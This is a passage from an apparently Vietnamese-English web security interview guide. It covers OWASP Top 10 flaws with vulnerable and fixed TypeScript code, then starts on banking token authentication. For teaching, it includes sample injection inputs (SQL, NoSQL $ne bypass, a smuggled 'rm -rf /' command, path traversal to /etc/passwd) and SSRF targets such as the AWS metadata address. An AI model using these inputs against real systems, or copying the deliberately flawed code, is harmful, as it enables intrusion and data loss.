✅ Bug bounty program (HackerOne, Bugcrowd)
✅ Security code review
✅ SAST (Static Analysis) tools
✅ DAST (Dynamic Analysis) tools
*/
```

---

## **🎓 TỔNG KẾT - Security Mindset**

### **🧠 Defense in Depth (Phòng Thủ Nhiều Tầng)**

```
┌────────────────────────────────────────────────────────────────┐
│                    SECURITY LAYERS                              │
├────────────────────────────────────────────────────────────────┤
│  🌐 Network Layer:    Firewall, WAF, DDoS protection           │
│  🔒 Transport Layer:  HTTPS/TLS 1.3, Certificate pinning       │
│  🔐 Application:      Input validation, Output encoding         │
│  👤 Authentication:   2FA, OAuth, JWT, Session management       │
│  🔑 Authorization:    RBAC, Least privilege                     │
│  💾 Data:             Encryption at rest, Hashing passwords     │
│  📝 Logging:          Security events, Anomaly detection        │
│  🧪 Testing:          Penetration testing, Vulnerability scans  │
└────────────────────────────────────────────────────────────────┘
```

### **✅ Security Best Practices Summary**

1. **NEVER trust user input** - Validate everything server-side
2. **Use HTTPS everywhere** - No exceptions, even for non-sensitive sites
3. **Hash passwords** - bcrypt/argon2, NEVER encrypt passwords
4. **Use HttpOnly cookies** - For refresh tokens
5. **Implement CSRF protection** - Tokens for state-changing operations
6. **Enable CSP headers** - Prevent XSS attacks
7. **Rate limit** - All APIs, especially auth endpoints
8. **Use prepared statements** - Prevent SQL injection
9. **Keep dependencies updated** - npm audit, Snyk, Dependabot
10. **Log security events** - Failed logins, XSS attempts, SQL injection
11. **Implement 2FA** - For sensitive operations
12. **Use SRI for CDN files** - Verify integrity
13. **Validate file uploads** - MIME type + magic number + virus scan
14. **Store secrets in env vars** - Never hardcode in source
15. **Principle of least privilege** - Minimal permissions
16. **Regular security audits** - Penetration testing, code reviews
17. **Educate developers** - Security training, OWASP Top 10
18. **Have incident response plan** - Know what to do when breached

### **🚨 OWASP Top 10 (2021) - Deep Dive**

---

#### **A01:2021 - Broken Access Control (97% ứng dụng có lỗi này)**

```typescript
// ❌ BAD: Missing authorization check
app.get('/api/users/:userId/profile', async (req, res) => {
  const profile = await db.users.findById(req.params.userId);
  res.json(profile); // Bất kỳ user nào cũng xem được profile của nhau!
});

// ✅ GOOD: Verify ownership
app.get('/api/users/:userId/profile', authenticate, async (req, res) => {
  const requestedUserId = req.params.userId;
  const currentUserId = req.user.id;

  // Check authorization
  if (requestedUserId !== currentUserId && !req.user.isAdmin) {
    return res.status(403).json({ error: 'Access denied' });
  }

  const profile = await db.users.findById(requestedUserId);
  res.json(profile);
});

// 🛡️ Common Patterns:
// 1. IDOR (Insecure Direct Object Reference)
//    URL: /api/invoices/1234 → Change to /api/invoices/1235 (xem invoice người khác)
//    Fix: Verify ownership trước khi trả data

// 2. Missing Function Level Access Control
//    User thường access /admin/deleteUser endpoint
//    Fix: Middleware kiểm tra role/permission

// 3. CORS Misconfiguration
//    Access-Control-Allow-Origin: * (cho phép tất cả domain)
//    Fix: Whitelist specific domains
```

---

#### **A02:2021 - Cryptographic Failures (Mất Mát Bảo Mật Mã Hóa)**

```typescript
// ❌ BAD: Weak encryption (MD5, SHA1 đã bị crack)
const hash = crypto.createHash('md5').update(password).digest('hex');

// ✅ GOOD: Strong password hashing (bcrypt, argon2)
import bcrypt from 'bcryptjs';

async function hashPassword(password: string): Promise<string> {
  const salt = await bcrypt.genSalt(12); // Cost factor 12 (khuyến nghị)
  return bcrypt.hash(password, salt);
}

async function verifyPassword(
  password: string,
  hash: string
): Promise<boolean> {
  return bcrypt.compare(password, hash);
}

// ❌ BAD: Lưu API keys trong code
const STRIPE_KEY = 'sk_live_abc123...';

// ✅ GOOD: Dùng environment variables
const STRIPE_KEY = process.env.STRIPE_SECRET_KEY;

// ❌ BAD: Truyền sensitive data qua GET (URL có thể bị log)
fetch('/api/checkout?creditCard=1234567890123456');

// ✅ GOOD: Dùng POST với HTTPS
fetch('/api/checkout', {
  method: 'POST',
  body: JSON.stringify({ creditCard: encrypted }),
  headers: { 'Content-Type': 'application/json' },
});

// 🛡️ Encryption at Rest (Mã hóa dữ liệu lưu trữ)
import { createCipheriv, createDecipheriv, randomBytes } from 'crypto';

function encrypt(text: string, key: Buffer): { encrypted: string; iv: string } {
  const iv = randomBytes(16); // Initialization Vector
  const cipher = createCipheriv('aes-256-gcm', key, iv);

  let encrypted = cipher.update(text, 'utf8', 'hex');
  encrypted += cipher.final('hex');

  return { encrypted, iv: iv.toString('hex') };
}

function decrypt(encrypted: string, key: Buffer, iv: string): string {
  const decipher = createDecipheriv('aes-256-gcm', key, Buffer.from(iv, 'hex'));

  let decrypted = decipher.update(encrypted, 'hex', 'utf8');
  decrypted += decipher.final('utf8');

  return decrypted;
}
```

---

#### **A03:2021 - Injection (SQL, NoSQL, Command Injection)**

```typescript
// ❌ BAD: SQL Injection vulnerability
app.get('/users', async (req, res) => {
  const name = req.query.name;
  const query = `SELECT * FROM users WHERE name = '${name}'`;
  // Hacker nhập: ' OR '1'='1
  // Query thành: SELECT * FROM users WHERE name = '' OR '1'='1'
  // → Trả tất cả users!
});

// ✅ GOOD: Prepared statements (parameterized queries)
app.get('/users', async (req, res) => {
  const name = req.query.name;
  const query = 'SELECT * FROM users WHERE name = ?';
  const users = await db.query(query, [name]); // Driver tự escape
  res.json(users);
});

// ❌ BAD: NoSQL Injection (MongoDB)
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  const user = await User.findOne({ username, password });
  // Hacker gửi: { "username": "admin", "password": { "$ne": null } }
  // Query thành: { username: "admin", password: { $ne: null } } → bypass password!
});

// ✅ GOOD: Validate input type
app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  // Validate input types
  if (typeof username !== 'string' || typeof password !== 'string') {
    return res.status(400).json({ error: 'Invalid input' });
  }

  const user = await User.findOne({ username });
  const isValid = await bcrypt.compare(password, user.passwordHash);

  if (!isValid) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  res.json({ token: generateToken(user) });
});

// ❌ BAD: Command Injection
app.get('/download', (req, res) => {
  const filename = req.query.filename;
  exec(`cat /files/${filename}`, (err, stdout) => {
    // Hacker nhập: ../../etc/passwd
    // Hoặc: file.txt; rm -rf /
    res.send(stdout);
  });
});

// ✅ GOOD: Whitelist filenames, không dùng exec với user input
const ALLOWED_FILES = ['report.pdf', 'invoice.pdf'];

app.get('/download', (req, res) => {
  const filename = req.query.filename;

  if (!ALLOWED_FILES.includes(filename)) {
    return res.status(400).json({ error: 'Invalid filename' });
  }

  const filepath = path.join(__dirname, 'files', filename);
  res.sendFile(filepath);
});
```

---

#### **A04:2021 - Insecure Design (Thiết Kế Không An Toàn)**

```typescript
// ❌ BAD: No rate limiting cho password reset
app.post('/forgot-password', async (req, res) => {
  const { email } = req.body;
  await sendPasswordResetEmail(email); // Hacker spam email!
  res.json({ success: true });
});

// ✅ GOOD: Rate limiting + CAPTCHA
import rateLimit from 'express-rate-limit';

const passwordResetLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 phút
  max: 3, // Tối đa 3 requests
  message: 'Too many password reset requests. Please try again later.',
});

app.post('/forgot-password', passwordResetLimiter, async (req, res) => {
  const { email, captchaToken } = req.body;

  // Verify CAPTCHA
  const isHuman = await verifyCaptcha(captchaToken);
  if (!isHuman) {
    return res.status(400).json({ error: 'CAPTCHA verification failed' });
  }

  await sendPasswordResetEmail(email);
  res.json({ success: true });
});

// 🛡️ Security by Design Patterns:
// 1. Zero Trust Architecture - Không tin bất kỳ request nào
// 2. Principle of Least Privilege - Quyền tối thiểu cần thiết
// 3. Defense in Depth - Nhiều tầng bảo mật
// 4. Fail Secure - Khi lỗi → deny access, không phải allow
```

---

#### **A05:2021 - Security Misconfiguration**

```typescript
// ❌ BAD: Verbose error messages
app.get('/api/users/:id', async (req, res) => {
  try {
    const user = await db.users.findById(req.params.id);
    res.json(user);
  } catch (error) {
    // Leak database structure, version, query
    res.status(500).json({ error: error.message, stack: error.stack });
  }
});

// ✅ GOOD: Generic error messages in production
app.get('/api/users/:id', async (req, res) => {
  try {
    const user = await db.users.findById(req.params.id);
    res.json(user);
  } catch (error) {
    // Log chi tiết server-side (cho devs)
    logger.error('Database error:', error);

    // Trả generic message cho client (không leak info)
    if (process.env.NODE_ENV === 'production') {
      res.status(500).json({ error: 'Internal server error' });
    } else {
      res.status(500).json({ error: error.message });
    }
  }
});

// ❌ BAD: Default credentials
const dbConfig = {
  username: 'admin',
  password: 'admin123',
};

// ✅ GOOD: Environment-specific configs
const dbConfig = {
  username: process.env.DB_USERNAME,
  password: process.env.DB_PASSWORD,
  ssl: process.env.NODE_ENV === 'production',
};

// 🛡️ Security Headers (Express helmet)
import helmet from 'helmet';

app.use(helmet()); // Tự động set các security headers
```

---

#### **A06:2021 - Vulnerable and Outdated Components**

```bash
# ❌ BAD: Không update dependencies
npm install lodash@3.10.1  # Có CVE-2019-10744 (Prototype Pollution)

# ✅ GOOD: Regular dependency audits
npm audit                    # Check vulnerabilities
npm audit fix                # Auto-fix non-breaking
npm audit fix --force        # Fix breaking changes (test trước!)

# ✅ Automated scanning (CI/CD)
# .github/workflows/security.yml
name: Security Scan
on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - run: npm audit --audit-level=moderate
      - uses: snyk/actions/node@master  # Snyk scan
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
```

```typescript
// 🛡️ Dependency Security Checklist:
const securityChecklist = {
  weekly: [
    'npm audit',
    'Check Snyk/Dependabot PRs',
    'Review security advisories (GitHub Security tab)',
  ],
  monthly: [
    'Update major versions (test thoroughly)',
    'Remove unused dependencies (npm-check)',
  ],
  beforeDeploy: [
    'npm outdated',
    'npm audit --production',
    'Verify lockfile integrity',
  ],
};

// ✅ Subresource Integrity (SRI) cho CDN
// Verify CDN file không bị tamper
<script
  src="https://cdn.jsdelivr.net/npm/react@18.2.0/umd/react.production.min.js"
  integrity="sha384-KyZXEAg3QhqLMpG8r+Knujsl5+z0z0z..."
  crossorigin="anonymous"
></script>;
```

---

#### **A07:2021 - Identification and Authentication Failures**

```typescript
// ❌ BAD: Weak password policy
function validatePassword(password: string): boolean {
  return password.length >= 6; // Quá yếu!
}

// ✅ GOOD: Strong password policy
function validatePassword(password: string): boolean {
  const minLength = 12;
  const hasUpperCase = /[A-Z]/.test(password);
  const hasLowerCase = /[a-z]/.test(password);
  const hasNumber = /\d/.test(password);
  const hasSpecialChar = /[!@#$%^&*(),.?":{}|<>]/.test(password);

  return (
    password.length >= minLength &&
    hasUpperCase &&
    hasLowerCase &&
    hasNumber &&
    hasSpecialChar
  );
}

// ❌ BAD: No brute force protection
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  // Hacker thử 1000 passwords/giây!
});

// ✅ GOOD: Rate limiting + Account lockout
import rateLimit from 'express-rate-limit';
import RedisStore from 'rate-limit-redis';

const loginLimiter = rateLimit({
  store: new RedisStore({ client: redisClient }),
  windowMs: 15 * 60 * 1000, // 15 phút
  max: 5, // 5 attempts
  message: 'Too many login attempts. Account locked for 15 minutes.',
});

app.post('/login', loginLimiter, async (req, res) => {
  const { username, password } = req.body;

  // Track failed attempts trong database
  const user = await User.findOne({ username });

  if (!user || !(await bcrypt.compare(password, user.passwordHash))) {
    await incrementFailedAttempts(username);
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  // Reset failed attempts on success
  await resetFailedAttempts(username);

  res.json({ token: generateToken(user) });
});

// ✅ GOOD: Multi-Factor Authentication (MFA)
import speakeasy from 'speakeasy';

// Generate TOTP secret (once per user)
const secret = speakeasy.generateSecret({ length: 20 });
await User.update({ id: userId }, { totpSecret: secret.base32 });

// Verify TOTP code (mỗi lần login)
function verifyTOTP(token: string, secret: string): boolean {
  return speakeasy.totp.verify({
    secret,
    encoding: 'base32',
    token,
    window: 2, // Allow ±2 time steps (60s tolerance)
  });
}

app.post('/login/verify-mfa', async (req, res) => {
  const { userId, totpCode } = req.body;
  const user = await User.findById(userId);

  if (!verifyTOTP(totpCode, user.totpSecret)) {
    return res.status(401).json({ error: 'Invalid MFA code' });
  }

  res.json({ token: generateToken(user) });
});
```

---

#### **A08:2021 - Software and Data Integrity Failures**

```typescript
// ❌ BAD: Unsigned updates (supply chain attack)
fetch('https://cdn.example.com/update.js')
  .then(res => res.text())
  .then(code => eval(code)); // Hacker thay thế file trên CDN!

// ✅ GOOD: Verify integrity với SRI
<script
  src="https://cdn.example.com/library.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/ux..."
  crossorigin="anonymous"
></script>

// ✅ GOOD: Digital signatures cho updates
import { createVerify } from 'crypto';

async function verifyUpdate(updateData: Buffer, signature: string, publicKey: string): Promise<boolean> {
  const verify = createVerify('SHA256');
  verify.update(updateData);
  verify.end();

  return verify.verify(publicKey, signature, 'hex');
}

// Trước khi apply update:
const isValid = await verifyUpdate(updateData, signature, PUBLIC_KEY);
if (!isValid) {
  throw new Error('Update signature verification failed!');
}

// 🛡️ CI/CD Pipeline Security
// .github/workflows/deploy.yml
jobs:
  deploy:
    steps:
      - name: Verify dependencies
        run: npm audit --production

      - name: Check lockfile
        run: |
          if git diff --name-only HEAD~1 | grep -q "package-lock.json"; then
            echo "Lockfile changed - review required!"
            exit 1
          fi

      - name: Build with integrity check
        run: |
          npm ci  # Use lockfile (không update packages)
          npm run build
          sha256sum dist/* > checksums.txt  # Verify build output
```

---

#### **A09:2021 - Security Logging and Monitoring Failures**

```typescript
// ❌ BAD: Không log security events
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  const user = await User.findOne({ username });

  if (!user || !(await bcrypt.compare(password, user.passwordHash))) {
    return res.status(401).json({ error: 'Invalid credentials' });
    // Không biết ai đang brute force attack!
  }
});

// ✅ GOOD: Comprehensive security logging
import winston from 'winston';

const securityLogger = winston.createLogger({
  level: 'info',
  format: winston.format.json(),
  transports: [
    new winston.transports.File({ filename: 'security.log' }),
    new winston.transports.Console(), // Dev only
  ],
});

app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  const ip = req.ip;
  const userAgent = req.get('User-Agent');

  const user = await User.findOne({ username });

  if (!user || !(await bcrypt.compare(password, user.passwordHash))) {
    // ✅ Log failed login attempt
    securityLogger.warn('Failed login attempt', {
      username,
      ip,
      userAgent,
      timestamp: new Date().toISOString(),
    });

    return res.status(401).json({ error: 'Invalid credentials' });
  }

  // ✅ Log successful login
  securityLogger.info('Successful login', {
    userId: user.id,
    username,
    ip,
    userAgent,
    timestamp: new Date().toISOString(),
  });

  res.json({ token: generateToken(user) });
});

// 🛡️ Real-time Alerting (Suspicious Activity Detection)
import { EventEmitter } from 'events';

const securityEvents = new EventEmitter();

// Alert on multiple failed logins
let failedAttempts = new Map<string, number>();

securityEvents.on('login:failed', (data) => {
  const { username, ip } = data;
  const key = `${username}:${ip}`;

  const attempts = (failedAttempts.get(key) || 0) + 1;
  failedAttempts.set(key, attempts);

  if (attempts >= 5) {
    // ⚠️ Alert security team
    sendAlert({
      type: 'BRUTE_FORCE_DETECTED',
      username,
      ip,
      attempts,
      timestamp: new Date(),
    });
  }
});

// Monitor unusual patterns
securityEvents.on('login:success', async (data) => {
  const { userId, ip, userAgent } = data;

  const lastLogin = await getLastLogin(userId);

  // Detect login from new location/device
  if (lastLogin.ip !== ip || lastLogin.userAgent !== userAgent) {
    await sendEmail(user.email, {
      subject: 'New login detected',
      body: `Login from ${ip} at ${new Date()}. If this wasn't you, reset password immediately.`,
    });
  }
});

// ✅ Log Events to Monitor:
const eventsToLog = [
  'login:success',
  'login:failed',
  'password:reset',
  'password:changed',
  'permission:denied',
  'xss:attempt',
  'sql:injection:attempt',
  'file:upload',
  'admin:action',
  'api:rate:limit',
  'session:expired',
];
```

---

#### **A10:2021 - Server-Side Request Forgery (SSRF)**

```typescript
// ❌ BAD: Unvalidated URL fetch
app.post('/fetch-url', async (req, res) => {
  const { url } = req.body;
  const response = await fetch(url); // Hacker nhập: http://localhost:6379/
  // → Access internal Redis server!
  // Hoặc: file:///etc/passwd
  res.send(await response.text());
});

// ✅ GOOD: Whitelist allowed domains
const ALLOWED_DOMAINS = ['api.example.com', 'cdn.example.com'];

app.post('/fetch-url', async (req, res) => {
  const { url } = req.body;

  // Parse URL
  const parsedUrl = new URL(url);

  // Check protocol (chỉ cho phép http/https)
  if (!['http:', 'https:'].includes(parsedUrl.protocol)) {
    return res.status(400).json({ error: 'Invalid protocol' });
  }

  // Check hostname (whitelist)
  if (!ALLOWED_DOMAINS.includes(parsedUrl.hostname)) {
    return res.status(400).json({ error: 'Domain not allowed' });
  }

  // Check không phải private IP
  const ip = await dns.resolve4(parsedUrl.hostname);
  if (isPrivateIP(ip[0])) {
    return res.status(400).json({ error: 'Private IP not allowed' });
  }

  const response = await fetch(url);
  res.send(await response.text());
});

// Helper: Detect private IPs
function isPrivateIP(ip: string): boolean {
  const parts = ip.split('.').map(Number);

  return (
    parts[0] === 10 || // 10.0.0.0/8
    (parts[0] === 172 && parts[1] >= 16 && parts[1] <= 31) || // 172.16.0.0/12
    (parts[0] === 192 && parts[1] === 168) || // 192.168.0.0/16
    parts[0] === 127 // 127.0.0.0/8 (localhost)
  );
}

// 🛡️ SSRF Protection Layers:
// 1. Whitelist allowed domains
// 2. Block private IPs (10.x, 192.168.x, 127.x)
// 3. Block metadata endpoints (169.254.169.254 - AWS metadata)
// 4. Timeout requests (max 5 seconds)
// 5. Limit response size (max 1MB)
```

---

### **📚 Learning Resources**

- **OWASP Top 10**: https://owasp.org/www-project-top-ten/
- **Web Security Academy**: https://portswigger.net/web-security
- **Hack The Box**: https://www.hackthebox.eu/
- **CTF Challenges**: https://ctftime.org/
- **Security Headers**: https://securityheaders.com/
- **SSL Labs**: https://www.ssllabs.com/ssltest/

---

**🎯 Remember:**

> "Security is not a product, but a process." - Bruce Schneier

> "The only truly secure system is one that is powered off, cast in a block of concrete and sealed in a lead-lined room with armed guards." - Gene Spafford

**✅ Good security = Layers + Education + Monitoring + Testing**



# 🎫 Q43: Authentication Flow An Toàn Cho Hệ Thống Ngân Hàng/Chứng Khoán - Access Token, Refresh Token, Cookie Security

## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**

### **🎯 Câu Trả Lời Ngắn Gọn (4-5 phút):**

**"Secure auth flow: Access Token (short-lived, 15min, memory) + Refresh Token (long-lived, 7-30 days, httpOnly cookie). Implement token rotation, XSS/CSRF protection, MFA cho high-security systems."**

**🔑 Architecture - Dual Token Pattern:**

**1. Access Token (JWT):**
- **Thời hạn**: 15 phút (ngắn - limit damage nếu stolen)
- **Lưu ở**: Memory (JS variable) - KHÔNG localStorage (XSS vulnerable)
- **Dùng để**: API calls - `Authorization: Bearer <token>`
- **Mất khi**: Refresh page → lấy lại từ refresh token

**2. Refresh Token:**
- **Thời hạn**: 7-30 ngày (dài - UX tốt)
- **Lưu ở**: **httpOnly Cookie** - JS không đọc được (chống XSS)
- **Flags**: `Secure` (HTTPS only), `SameSite=Strict` (chống CSRF)
- **Dùng để**: Lấy access token mới khi expired

**3. Authentication Flow:**
```
Login → Server return:
  - Access Token (response body)
  - Refresh Token (httpOnly cookie)
→ Client lưu access token in memory
→ API calls với access token
→ Token expired (15min) → call /refresh endpoint
→ Server verify refresh token (cookie) → return new access token
```

**4. Security Measures:**
- **Token Rotation**: Refresh token thay đổi mỗi lần dùng (detect stolen tokens)
- **Token Blacklist**: Revoke tokens khi logout/suspicious activity
- **MFA**: 2FA/OTP cho sensitive operations (transfer, withdraw)
- **Device fingerprinting**: Detect unusual login locations
- **Rate limiting**: Max 5 failed attempts → lock account 30min

**⚠️ Lỗi Thường Gặp:**
- Lưu tokens trong localStorage → **XSS steal tokens**
- Không rotate refresh tokens → stolen token dùng mãi
- CORS misconfiguration → expose tokens cross-origin
- Không implement CSRF tokens → cross-site request attacks

**💡 Kiến Thức Senior:**
- **JWT structure**: Header.Payload.Signature (Base64URL encoded)
- **Signature algorithms**: HS256 (symmetric, shared secret) vs **RS256** (asymmetric, safer - banking)
- **Silent refresh**: Background refresh trước khi expired (smooth UX)
- **Token introspection**: Server-side validation cho high-security (không tin client JWT)
- **OAuth 2.0 + PKCE**: Authorization Code Flow với Proof Key (mobile apps)

**Trả lời:**

Hệ thống authentication cho ngân hàng/chứng khoán yêu cầu **bảo mật cực kỳ cao** vì liên quan đến tiền bạc và thông tin nhạy cảm. Flow chuẩn sử dụng **JWT (JSON Web Token)** với **Access Token + Refresh Token** kết hợp **httpOnly Cookie**.

#### **📊 Tổng Quan Authentication Flow**

```
┌────────────────────────────────────────────────────────────────────┐
│              SECURE AUTHENTICATION FLOW                            │
│        (Banking/Trading System - Hệ Thống Ngân Hàng)              │
├────────────────────────────────────────────────────────────────────┤
│                                                                    │
│  🔑 ACCESS TOKEN                                                   │
│  ┌──────────────────────────────────────────────────────────────┐ │
│  │ • Thời hạn: 15 phút (ngắn)                                   │ │
│  │ • Lưu ở: Memory (JavaScript variable)                       │ │
│  │ • Dùng để: Gọi API (Authorization: Bearer <token>)          │ │
│  │ • Mất khi: Refresh page (phải lấy lại)                      │ │
│  │ • Bảo mật: Không lưu localStorage (XSS risk)                │ │
│  └──────────────────────────────────────────────────────────────┘ │
│                                                                    │
│  🔄 REFRESH TOKEN                                                  │
│  ┌──────────────────────────────────────────────────────────────┐ │
│  │ • Thời hạn: 7-30 ngày (dài)                                  │ │
│  │ • Lưu ở: httpOnly Cookie (server-side chỉ đọc được)         │ │
│  │ • Dùng để: Lấy Access Token mới khi hết hạn                 │ │
│  │ • Bảo mật: httpOnly + Secure + SameSite=Strict              │ │
│  │ • Không đọc được bởi JavaScript (chống XSS)                 │ │
│  └──────────────────────────────────────────────────────────────┘ │
│                                                                    │
│  🍪 SESSION COOKIE (Optional - cho Banking)                       │
│  ┌──────────────────────────────────────────────────────────────┐ │
│  │ • Thời hạn: Session (đóng browser = mất)                    │ │
│  │ • Lưu ở: httpOnly Cookie                                    │ │
│  │ • Dùng để: Session ID (server tracking)                     │ │
│  │ • Bảo mật: httpOnly + Secure                                │ │
│  └──────────────────────────────────────────────────────────────┘ │
└────────────────────────────────────────────────────────────────────┘
```

---

#### **🔐 1. Access Token vs Refresh Token - Phân Biệt Chi Tiết**

**Access Token (Token Truy Cập):**

```typescript
// 🔑 Cấu trúc JWT Access Token (3 phần: Header.Payload.Signature)
{
  "header": {  // 📋 Phần 1: Metadata về token
    "alg": "RS256",      // 🔐 Thuật toán mã hóa (RSA + SHA256 - asymmetric, an toàn cho banking)
    "typ": "JWT"         // 📝 Loại token (JSON Web Token)
  },
  "payload": {  // 📦 Phần 2: Dữ liệu user (claims - không mã hóa, chỉ Base64 encode)
    "sub": "user123",    // 👤 User ID - Subject (identifier duy nhất)
    "name": "John Doe",  // 📛 Tên user (hiển thị UI)
    "email": "john@example.com",  // 📧 Email
    "role": "trader",    // 🎭 Role: admin, trader, customer (phân quyền)
    "permissions": ["trade", "view_balance", "transfer"],  // 🔑 Quyền cụ thể
    "iat": 1699999999,   // ⏰ Issued At (thời điểm tạo - Unix timestamp)
    "exp": 1700000899    // ⌛ Expiry (hết hạn sau 15 phút - Unix timestamp)
  },
  "signature": "..."     // ✍️ Phần 3: Chữ ký số (verify token không bị giả mạo/sửa đổi)
  // Signature = HMAC-SHA256(base64(header) + "." + base64(payload), secret)
}

// 📌 Đặc điểm Access Token:
// ✅ ⏱️ Thời hạn ngắn: 5-15 phút (giảm thiệt hại nếu bị đánh cắp)
// ✅ 💾 Lưu trong memory (JavaScript variable - biến toàn cục hoặc state)
// ✅ 📡 Gửi kèm mọi API request: Authorization: Bearer <token>
// ✅ 📦 Chứa thông tin user (role, permissions - client không cần query lại)
// ✅ 🔓 Payload KHÔNG mã hóa (chỉ Base64 - ai cũng đọc được)
// ❌ 🚫 KHÔNG lưu localStorage/sessionStorage (XSS có thể đánh cắp)
// ❌ 🚫 KHÔNG chứa sensitive data (password, credit card, SSN)
```

**Refresh Token (Token Làm Mới):**

```typescript
// 🔄 Cấu trúc Refresh Token (thường là random string hoặc JWT đơn giản)
{
  "jti": "unique-token-id-abc123xyz",  // 🆔 Token ID duy nhất (JWT ID - để track/revoke)
  "sub": "user123",                    // 👤 User ID (Subject)
  "iat": 1699999999,                   // ⏰ Issued At (thời điểm tạo)
  "exp": 1702591999                    // ⌛ Expiry (hết hạn sau 30 ngày - 2592000 giây)
}

// 📌 Đặc điểm Refresh Token:
// ✅ ⏱️ Thời hạn dài: 7-30 ngày (hoặc vô thời hạn - UX tốt, không phải login liên tục)
// ✅ 🍪 Lưu trong httpOnly Cookie (JS KHÔNG đọc được bằng document.cookie)
// ✅ 🔄 Chỉ dùng để lấy Access Token mới (single purpose)
// ✅ 🗄️ Lưu trong database (để có thể revoke/blacklist khi cần)
// ✅ 🔒 Có thể revoke (thu hồi) từ server (logout, suspicious activity)
// ❌ 🚫 KHÔNG gửi kèm API thường (chỉ gửi tới /auth/refresh endpoint)
// ❌ 🚫 KHÔNG chứa nhiều thông tin (chỉ jti, sub, exp - minimal payload)
```

**Tại Sao Cần 2 Token?**

```
┌────────────────────────────────────────────────────────────┐
│                    TẠI SAO CẦN 2 TOKEN?                    │
├────────────────────────────────────────────────────────────┤
│                                                            │
│  Scenario 1: Chỉ dùng 1 Access Token dài hạn              │
│  ┌──────────────────────────────────────────────────────┐ │
│  │ ❌ Nếu token bị leak (XSS, network sniffing)         │ │
│  │    → Hacker có 30 ngày để dùng token                 │ │
│  │    → Không thể thu hồi (revoke)                      │ │
│  │    → RỦI RO CỰC CAO!                                 │ │
│  └──────────────────────────────────────────────────────┘ │
│                                                            │
│  Scenario 2: Dùng Access Token (15 phút) + Refresh Token  │
│  ┌──────────────────────────────────────────────────────┐ │
│  │ ✅ Access Token bị leak                              │ │
│  │    → Chỉ dùng được 15 phút                           │ │
│  │    → Tự động hết hạn                                 │ │
│  │                                                       │ │
│  │ ✅ Refresh Token bị leak                             │ │
│  │    → Lưu httpOnly cookie (khó bị XSS)               │ │
│  │    → Server có thể revoke (blacklist)               │ │
│  │    → Có thể detect suspicious activity               │ │
│  │                                                       │ │
│  │ → RỦI RO THẤP HƠN NHIỀU!                             │ │
│  └──────────────────────────────────────────────────────┘ │
└────────────────────────────────────────────────────────────┘
```

---

#### **🔄 2. Authentication Flow Chi Tiết (Step-by-Step)**

**A. Login Flow (Đăng Nhập):**

```typescript
// ============================================
// BƯỚC 1: User Login
// ============================================

// 🌐 Frontend: Gửi username + password đến server
async function login(username: string, password: string) {
  try {
    const response = await fetch('https://api.bank.com/auth/login', {
      method: 'POST',  // 📮 HTTP POST method
      headers: {
        'Content-Type': 'application/json',  // 📝 Gửi JSON data
      },
      body: JSON.stringify({  // 📦 Payload gửi lên server
        username,  // 👤 Username hoặc email
        password,  // 🔑 Password (sẽ hash bằng bcrypt ở server)
        // Optional: MFA code, device fingerprint
        mfaCode: '123456',  // 🔢 MFA/2FA code (Google Authenticator, SMS OTP)
        deviceId: getDeviceFingerprint(),  // 🖥️ Device fingerprint (detect thiết bị lạ)
      }),
      credentials: 'include', // ⚠️ QUAN TRỌNG: Cho phép gửi/nhận cookie (refresh token)
      // credentials: 'include' → browser tự động gửi cookies với request
      // và lưu Set-Cookie response vào browser
    });

    if (!response.ok) {  // ❌ Nếu login thất bại (4xx, 5xx status)
      throw new Error('Login failed');
    }

    const data = await response.json();  // 📦 Parse JSON response
    
    // 📝 Response structure từ server:
    // {
    //   accessToken: "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...",  // 🔑 Access Token (JWT string)
    //   user: { id: "123", name: "John", role: "trader" },  // 👤 User info (hiển thị UI)
    //   expiresIn: 900  // ⏰ 15 phút (900 giây - để tính refresh time)
    // }
    
    // 🍪 Refresh Token được server tự động set vào httpOnly cookie:
    // Set-Cookie: refreshToken=xyz...; HttpOnly; Secure; SameSite=Strict; Max-Age=2592000
    // → Browser tự động lưu cookie này (JS không thấy được)
    
    return data;  // ✅ Trả về accessToken + user info
  } catch (error) {
    console.error('Login error:', error);  // 🚨 Log lỗi ra console
    throw error;  // ⚠️ Throw lại để component xử lý (hiển thị lỗi cho user)
  }
}

// ============================================
// BƯỚC 2: Server Xử Lý Login
// ============================================

// 🔧 Backend (Node.js/Express) - Xử lý login request
app.post('/auth/login', async (req, res) => {
  const { username, password, mfaCode } = req.body;  // 📦 Lấy data từ request body
  
  // 🔹 BƯớc 1: Verify username + password (bcrypt hash comparison)
  const user = await db.findUserByUsername(username);  // 🔍 Tìm user trong database
  if (!user || !await bcrypt.compare(password, user.passwordHash)) {
    // bcrypt.compare() so sánh password plaintext với hash trong DB
    // → An toàn, không lưu password gốc
    return res.status(401).json({ error: 'Invalid credentials' });  // ❌ 401 Unauthorized
  }
  
  // 🔹 BƯớc 2: Verify MFA (Multi-Factor Authentication - xác thực 2 lớp)
  if (!verifyMFA(user, mfaCode)) {  // ✅ Kiểm tra OTP/2FA code
    // verifyMFA() kiểm tra TOTP (Google Authenticator) hoặc SMS OTP
    return res.status(401).json({ error: 'Invalid MFA code' });  // ❌ MFA sai
  }
  
  // 🔹 BƯớc 3: Check account status (không bị khóa, không bị tạm ngưng)
  if (user.isLocked || user.isSuspended) {
    // isLocked: Quá nhiều lần login sai (brute force protection)
    // isSuspended: Admin tạm ngưng account (vi phạm, fraud detection)
    return res.status(403).json({ error: 'Account locked' });  // ❌ 403 Forbidden
  }
  
  // 🔹 BƯớc 4: Generate Access Token (JWT - 15 phút)
  const accessToken = jwt.sign(  // 🔐 jwt.sign() tạo JWT token
    {  // 📦 Payload (claims) - thông tin user (Base64 encoded, KHÔNG mã hóa)
      sub: user.id,  // 🆔 Subject - User ID duy nhất
      name: user.name,  // 📛 Tên hiển thị
      email: user.email,  // 📧 Email
